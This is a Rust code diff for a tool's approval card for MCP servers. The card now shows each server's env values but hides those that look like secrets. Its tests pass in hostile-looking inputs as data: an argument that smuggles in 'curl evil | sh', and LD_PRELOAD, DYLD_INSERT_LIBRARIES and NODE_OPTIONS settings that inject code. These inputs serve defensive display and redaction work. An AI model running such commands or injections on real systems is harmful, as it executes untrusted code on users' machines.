@@ -76,8 +76,8 @@ pub enum ProjectServerState {
 }
 
 /// A server a worktree's `.claude/mcp.json` defines, as its approval shows
-/// it: the exact command, its arguments and its env names. An env value is
-/// shown only for a name that makes the program load code ([`runs_code_env`]).
+/// it: the exact command, its arguments and its env, each value shown unless
+/// it looks like a secret ([`masks_env`]).
 #[derive(Serialize, Clone, Debug, PartialEq, Eq)]
 #[serde(rename_all = "camelCase")]
 pub struct ProjectServer {
@@ -100,15 +100,21 @@ impl ProjectServer {
     }
 }
 
-/// Env names whose value makes the program load or run other code, so the
-/// card shows their values (the rest stay hidden): `NODE_OPTIONS`,
-/// `DYLD_*`, `LD_*`, `PYTHONSTARTUP`, `PYTHONPATH`, `RUBYOPT`, `PERL5OPT`,
-/// `BASH_ENV` and `ENV`.
-pub fn runs_code_env(name: &str) -> bool {
-    matches!(name, "NODE_OPTIONS" | "PYTHONSTARTUP" | "PYTHONPATH" | "RUBYOPT" | "PERL5OPT" | "BASH_ENV" | "ENV")
-        || name.starts_with("DYLD_")
-        || name.starts_with("LD_")
+/// Whether the card hides an env value: under a name that reads as a
+/// credential (`TOKEN`, `KEY`, `SECRET`, `PASSWORD`…; `mcp::secret_env_name`),
+/// or shaped like one by the secret guard's rules (`secret_scan::redact_line`,
+/// a provider token, a bearer or a URL password). Every other value shows:
+/// `PATH` picks the binary, and `NODE_PATH` or `npm_config_*` what it loads.
+/// Pure.
+pub fn masks_env(name: &str, value: &str) -> bool {
+    let assigned = format!("{name}={value}");
+    super::secret_env_name(name)
+        || crate::secret_scan::redact_line(value, &[]) != value
+        || crate::secret_scan::redact_line(&assigned, &[]) != assigned
 }
+
+/// What the card shows for a hidden env value, after its name.
+pub const HIDDEN_VALUE: &str = "(hidden)";
 
 /// `text` with nothing hidden: every control, invisible, zero-width and
 /// bidi character, and any whitespace but a plain space, written as its
@@ -170,9 +176,9 @@ fn display(cfg: &McpServerConfig) -> String {
     if !names.is_empty() {
         let env: Vec<String> = names
             .into_iter()
-            .map(|n| match runs_code_env(n) {
-                true => format!("{}={}", visible(n), visible(&shell_quote(&cfg.env[n]))),
-                false => visible(n),
+            .map(|n| match masks_env(n, &cfg.env[n]) {
+                true => format!("{}={HIDDEN_VALUE}", visible(n)),
+                false => format!("{}={}", visible(n), visible(&shell_quote(&cfg.env[n]))),
             })
             .collect();
         line.push_str(&format!(" \u{b7} env {}", env.join(", ")));
@@ -309,13 +315,38 @@ mod tests {
         assert_eq!(
             server.display,
             "node docs.js 'it'\\''s here' '--x\u{2420}\u{d7}300; curl evil | sh' 'safe\\u{202e}txt.js' 'a\\u{200b}b' 'bell\\u{7}' 'tab\\u{9}x' \u{b7} \
-             env API_TOKEN, DYLD_INSERT_LIBRARIES=/tmp/x.dylib, LD_PRELOAD=x.so, NODE_OPTIONS='--require ./hook.js'"
+             env API_TOKEN=(hidden), DYLD_INSERT_LIBRARIES=/tmp/x.dylib, LD_PRELOAD=x.so, NODE_OPTIONS='--require ./hook.js'"
         );
         assert!(!server.shown().contains("sk-secret-value"), "other env values stay hidden");
         assert_eq!(server.shown(), format!("docs: {}", server.display));
         assert_eq!(visible("a   b"), "a   b", "a short run of spaces stays");
         assert_eq!(visible("\u{a0}\u{2066}"), "\\u{a0}\\u{2066}");
-        assert!(runs_code_env("BASH_ENV") && runs_code_env("ENV") && runs_code_env("PYTHONPATH") && !runs_code_env("PATH"));
+    }
+
+    #[test]
+    fn the_card_shows_every_env_value_but_a_secret() {
+        let dir = tempfile::tempdir().unwrap();
+        let token = format!("ghp_{}", "a1B2".repeat(9));
+        let entry = serde_json::json!({ "mcpServers": { "docs": {
+            "command": "npx",
+            "args": ["docs-server"],
+            "env": {
+                "PATH": "/tmp/shim:/usr/bin",
+                "NODE_PATH": "./vendor/hooks",
+                "npm_config_prefix": "/tmp/npm",
+                "UPSTREAM": token.clone(),
+                "DOCS_PASSWORD": "hunter2",
+            },
+        } } });
+        write(dir.path(), &entry.to_string());
+        let server = &project_servers(dir.path(), &HashMap::new(), &NoApprovals)[0].0;
+        assert_eq!(
+            server.display,
+            "npx docs-server \u{b7} env DOCS_PASSWORD=(hidden), NODE_PATH=./vendor/hooks, PATH=/tmp/shim:/usr/bin, \
+             UPSTREAM=(hidden), npm_config_prefix=/tmp/npm"
+        );
+        assert!(!server.shown().contains(&token) && !server.shown().contains("hunter2"));
+        assert!(!masks_env("PATH", "/usr/local/bin:/usr/bin") && !masks_env("NODE_OPTIONS", "--require ./x.js"));
     }
 
     #[test]
